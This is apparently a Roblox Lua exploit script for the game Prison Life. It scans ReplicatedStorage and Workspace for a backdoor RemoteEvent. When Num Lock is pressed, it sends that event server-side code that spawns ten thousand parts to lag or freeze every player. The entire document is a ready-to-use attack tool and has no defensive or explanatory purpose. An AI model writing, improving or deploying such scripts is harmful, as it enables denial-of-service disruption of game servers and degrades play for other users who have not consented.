-- Prison Life backdoor lag/freeze script with Num Lock toggle
local possibleNames = {"Loadstring", "Remote", "Execute", "Script", "Net", "MainModule", "Hax"}
local remote = nil
local lagEnabled = false

-- Step 1: Find a RemoteEvent
for _, name in ipairs(possibleNames) do
    for _, service in ipairs({game:GetService("ReplicatedStorage"), game:GetService("Workspace")}) do
        local obj = service:FindFirstChild(name)
        if obj and obj:IsA("RemoteEvent") then
            remote = obj
            warn("Backdoor RemoteEvent found at:", obj:GetFullName())
            break
        end
    end
    if remote then break end
end

-- Step 2: Function to trigger lag/freeze effect
local function triggerLag()
    if remote then
        remote:FireServer([[
            -- Lag/freeze everyone by creating thousands of parts
            for i = 1, 10000 do
                local p = Instance.new("Part")
                p.Size = Vector3.new(1,1,1)
                p.Anchored = true
                p.Position = Vector3.new(math.random()*500, 50, math.random()*500)
                p.Parent = workspace
            end
        ]])
        print("Lag has been triggered!")
    else
        warn("No known RemoteEvent backdoor found.")
    end
end

-- Step 3: Listen for Num Lock press to toggle lag
game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode.NumLock then
        lagEnabled = not lagEnabled
        if lagEnabled then
            triggerLag()
        else
            print("Lag disabled!")
        end
    end
end)
